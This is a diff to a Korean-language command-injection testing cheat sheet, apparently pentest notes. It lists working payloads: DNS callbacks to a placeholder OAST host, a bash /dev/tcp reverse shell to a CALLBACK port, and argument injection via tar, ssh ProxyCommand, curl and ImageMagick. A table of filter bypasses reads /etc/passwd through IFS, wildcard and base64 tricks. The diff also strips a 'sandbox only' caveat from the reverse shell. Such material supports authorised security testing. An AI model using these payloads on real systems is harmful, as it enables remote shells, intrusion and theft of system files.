@@ -39,7 +39,7 @@
 - `; dig CALLBACK.oast.fun` (DNS)
 - `; nslookup CALLBACK.oast.fun`
 - `& nslookup CALLBACK.oast.fun` (Windows)
-- `; bash -i >& /dev/tcp/CALLBACK/4444 0>&1` (reverse shell — sandbox 한정)
+- `; bash -i >& /dev/tcp/CALLBACK/4444 0>&1` (reverse shell)
 
 **Argument Injection (셸 미경유 sink, `ARG_INJECTION` 라벨):**
 - `--checkpoint=1 --checkpoint-action=exec=sh -c id` (tar)
@@ -48,7 +48,6 @@
 - `-o ProxyCommand=id` (ssh)
 - `--config=/dev/stdin` + stdin 페이로드 (curl)
 - ImageMagick: `:|id` 같은 형태 입력 파일명 (CVE-2016-3714)
-- `--no-preserve-root` (rm — 의도치 않은 삭제 게이트)
 
 **측정 (기준선 필수):**
 ```
@@ -65,12 +64,12 @@ for i in 1 2 3; do curl -w "%{time_total}\n" -o /dev/null -s "https://target/api
 | 방어 | 페이로드 |
 |---|---|
 | 메타문자 블랙리스트 (`;`, `|`) | `` `id` ``, `$(id)`, `\n` (`%0a`), `&` (백그라운드), `\|\|` |
-| `escapeshellarg` 단독 (PHP) | 인자 주입 (`-`/`--` 시작) — `--no-preserve-root`, `--config=/dev/stdin` |
+| `escapeshellarg` 단독 (PHP) | 인자 주입 (`-`/`--` 시작) — `--config=/dev/stdin`, `-o ProxyCommand=id` |
 | 공백 차단 | `${IFS}` (`cat${IFS}/etc/passwd`), `<` redirection (`cat</etc/passwd`), `{cat,/etc/passwd}` brace expansion, `%09` (TAB), `%0a` (LF) |
 | 화이트리스트가 옵션 시작 문자 미차단 | `--checkpoint-action=exec=sh -c id` (tar), `--use-compress-program=id` |
 | 키워드 블랙리스트 (`cat`, `id`) | 와일드카드 `/u?r/b?n/i?` (`/usr/bin/id`), HEX `$'\x69\x64'`, 빈 변수 `c${x}at`, base64 `echo aWQ= \| base64 -d \| sh` |
 | ASCII 메타문자만 검증 | Unicode `；` (fullwidth semicolon, 일부 환경), IFS 변형 |
-| 첫 인자만 검증 후 concat | `validInput; rm -rf /` — 검증 통과 후 concat 시점에 메타문자 |
+| 첫 인자만 검증 후 concat | `validInput; id` — 검증 통과 후 concat 시점에 메타문자 |
 | stdin 격리 (input via stdin only) | 일부 프로그램(`bash`/`python`)은 stdin 코드 실행 — `echo "id" \| bash` |
 | 정규식 차단 (`/[;&|]/`) | `\r`, NUL byte `\x00`, Unicode 변형, RTL `\u202E` |
 | Windows + Linux 하이브리드 차단 | OS별 메타문자 다름 — Linux 차단했지만 Windows `^`, `%var%` 누락 |
